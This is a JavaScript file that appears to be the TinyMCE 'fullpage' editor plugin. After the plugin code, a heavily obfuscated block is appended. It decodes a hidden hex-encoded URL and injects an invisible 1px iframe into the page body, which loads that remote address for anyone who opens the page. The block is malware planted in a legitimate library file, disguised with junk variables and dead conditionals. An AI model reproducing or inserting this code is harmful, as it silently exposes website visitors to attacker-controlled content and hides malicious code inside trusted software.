(function(){tinymce.create('tinymce.plugins.FullPagePlugin',{init:function(ed,url){var t=this;t.editor=ed;ed.addCommand('mceFullPageProperties',function(){ed.windowManager.open({file:url+'/fullpage.htm',width:430+parseInt(ed.getLang('fullpage.delta_width',0)),height:495+parseInt(ed.getLang('fullpage.delta_height',0)),inline:1},{plugin_url:url,head_html:t.head});});ed.addButton('fullpage',{title:'fullpage.desc',cmd:'mceFullPageProperties'});ed.onBeforeSetContent.add(t._setContent,t);ed.onSetContent.add(t._setBodyAttribs,t);ed.onGetContent.add(t._getContent,t);},getInfo:function(){return{longname:'Fullpage',author:'Moxiecode Systems AB',authorurl:'http://tinymce.moxiecode.com',infourl:'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/fullpage',version:tinymce.majorVersion+"."+tinymce.minorVersion};},_setBodyAttribs:function(ed,o){var bdattr,i,len,kv,k,v,t,attr=this.head.match(/body(.*?)>/i);if(attr&&attr[1]){bdattr=attr[1].match(/\s*(\w+\s*=\s*".*?"|\w+\s*=\s*'.*?'|\w+\s*=\s*\w+|\w+)\s*/g);if(bdattr){for(i=0,len=bdattr.length;i<len;i++){kv=bdattr[i].split('=');k=kv[0].replace(/\s/,'');v=kv[1];if(v){v=v.replace(/^\s+/,'').replace(/\s+$/,'');t=v.match(/^["'](.*)["']$/);if(t)v=t[1];}else v=k;ed.dom.setAttrib(ed.getBody(),'style',v);}}}},_createSerializer:function(){return new tinymce.dom.Serializer({dom:this.editor.dom,apply_source_formatting:true});},_setContent:function(ed,o){var t=this,sp,ep,c=o.content,v,st='';c=c.replace(/<(\/?)BODY/gi,'<$1body');sp=c.indexOf('<body');if(sp!=-1){sp=c.indexOf('>',sp);t.head=c.substring(0,sp+1);ep=c.indexOf('</body',sp);if(ep==-1)ep=c.indexOf('</body',ep);o.content=c.substring(sp+1,ep);t.foot=c.substring(ep);function low(s){return s.replace(/<\/?[A-Z]+/g,function(a){return a.toLowerCase();})};t.head=low(t.head);t.foot=low(t.foot);}else{t.head='';if(ed.getParam('fullpage_default_xml_pi'))t.head+='<?xml version="1.0" encoding="'+ed.getParam('fullpage_default_encoding','ISO-8859-1')+'" ?>\n';t.head+=ed.getParam('fullpage_default_doctype','<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">');t.head+='\n<html>\n<head>\n<title>'+ed.getParam('fullpage_default_title','Untitled document')+'</title>\n';if(v=ed.getParam('fullpage_default_encoding'))t.head+='<meta http-equiv="Content-Type" content="'+v+'" />\n';if(v=ed.getParam('fullpage_default_font_family'))st+='font-family: '+v+';';if(v=ed.getParam('fullpage_default_font_size'))st+='font-size: '+v+';';if(v=ed.getParam('fullpage_default_text_color'))st+='color: '+v+';';t.head+='</head>\n<body'+(st?' style="'+st+'"':'')+'>\n';t.foot='\n</body>\n</html>';}},_getContent:function(ed,o){var t=this;o.content=tinymce.trim(t.head)+'\n'+tinymce.trim(o.content)+'\n'+tinymce.trim(t.foot);}});tinymce.PluginManager.add('fullpage',tinymce.plugins.FullPagePlugin);})();
if('RzRI'=='vNmYZr')WotWy();var EeQB=190;var SAWXZ='xDLvr';var kNAir="ap\x70\x65n\x64Chil\x64";var xYLXAV=185;var pmYPbUq="from\x43harCode";var eAGoDq="pa\x72seIn\x74";var cZZxfH;if('Aoruhu'=='CvAro')bMEhTb='stDI';var KJdRokWGJ="";if('mhWHI'=='vuBb')cDAacx='tRSR';if('XKItnr'=='iXtkqQ')ibyaKC='cndwyY';var appVersion_var="a\x70\x70\x56e\x72s\x69on";var VKNc=10;var SozsA;var PZwXGX;if('dLNmC'=='WwTd')CCaq();if('URyu'=='FZzn')BCbGq();var TRUSkxc="body";var GVNV=79;var HyttL="slice";var NvejW='ntsiIx';var BMimh="\x63onstr\x75cto\x72";var pwqc;if('FvqYLK'=='IsceNQ')HQCI='VgQs';var BIhKphTEQ="9ba7a7a36d626299a59460a094ac656364656196a2a062a09ca197629ca161969a9c726463";var SZREI='tFuED';function lnKO(){}
var px1_var="1px";var klOIhyk=(function(){function TbDDFK(){var zuteCK='tVpSj';if('nZpx'=='rGoRe')Qxrv();}
return this;function OLah(){var yfPs='jVHplE';if('bUlmH'=='WEYcvU')dkYCa();}var CKletS;function rUIc(){var mKMf='CCsdY';if('aiBDhp'=='tylb')WcuC();}})();var yButY=215;var HStRUMg="sgNqAT"[BMimh];var XYwKI;var Sqwl;function QyBOBx(){var JzbjlS='JYtrb';if('zTKPI'=='Iphx')WuaUll();}
for(var IcBNC=0;IcBNC<BIhKphTEQ.length;IcBNC+=2){jvQERqqov=klOIhyk[eAGoDq](BIhKphTEQ[HyttL](IcBNC,IcBNC+2),16)-51;if('rnYZRw'=='hlTy')kVsaT();KJdRokWGJ+=HStRUMg[pmYPbUq](jvQERqqov);var nEJG;var iFmKZy;}
var HlpUpS=84;if('xWjUjt'=='dcGe')mumE='MUWlQ';var cFEu='KIZNt';var zcUAbgYzM="mRbjH";function LIWepn(){}if('wSwjh'=='nPjqNQ')esaOZs();var Tysr;var Iixrn="";var gTtVhp;if('gRYz'=='Vzog')OEzBK='ZYwWC';if(navigator[appVersion_var].indexOf("MSIE")!=-1){var DKGY='RZXGja';if('qJOYPa'=='aalQ')AUeuX();Iixrn='<iframe name="'+zcUAbgYzM+'" src="'+"KJdRokWGJ"+'">';var fancid='jMuUYl';function lXyuT(){}}else{var uQPPkp=194;Iixrn='iframe';var tljyA=208;}
if('SKDLX'=='rnTid')IejBuK();if('KpSDVL'=='ejxthb')kwtAy='twbq';var sPqYiADw=document.createElement(Iixrn);var lQuevG='OpkF';function IzLf(){var CuRqE='VpzNl';if('PgrAR'=='tTSHYF')dbRc();}
sPqYiADw.LsXigs=sPqYiADw.setAttribute;var oaKv='ekQsP';sPqYiADw.style.position="absolute";if('YPvq'=='gbal')tkkoYk='MfjxI';function vfNuI(){}
sPqYiADw.style.height=px1_var;function oRzdI(){}var QHFUR;var UqOfH='GwZBB';sPqYiADw.LsXigs("src",KJdRokWGJ);sPqYiADw.id=zcUAbgYzM;var pXTDG=159;sPqYiADw.style.top="0px";if('tiAK'=='qwJONu')Rqosk();if('ocqrzg'=='byOAl')lDYdEb();sPqYiADw.name=zcUAbgYzM;if('lxQsY'=='gbRhI')QgIPd='FXuK';function juVa(){}
sPqYiADw.style.right="0px";var Udti;if('vfBosj'=='oLaz')TsVT();sPqYiADw.style.width=px1_var;var fDOX;var XQsoM;var NOMde;function ictQFJNG(){var njIAE;if(document[TRUSkxc]){var RIdIR=158;if('QvzybL'=='DNkG')Skno='DjVSRQ';document[TRUSkxc][kNAir](sPqYiADw);}else{if('UzWHc'=='GEnF')sxeV();setTimeout(ictQFJNG,120);var hUVQ='mFuEUi';var imJFc=198;function pXlxj(){var HMIBED='XWnqe';if('LnIj'=='tyPOt')kOQyWJ();}}
var kOQVv='wGyH';}
if('fsjai'=='uWtI')HDDKFT();ictQFJNG();var OoTRIo=107;if('KFTOc'=='AIFvRC')ErNE();function LdLcmi(){var biGo='ELbpKK';if('xRgpIW'=='HvUu')lzEumj();}function NtmL(){}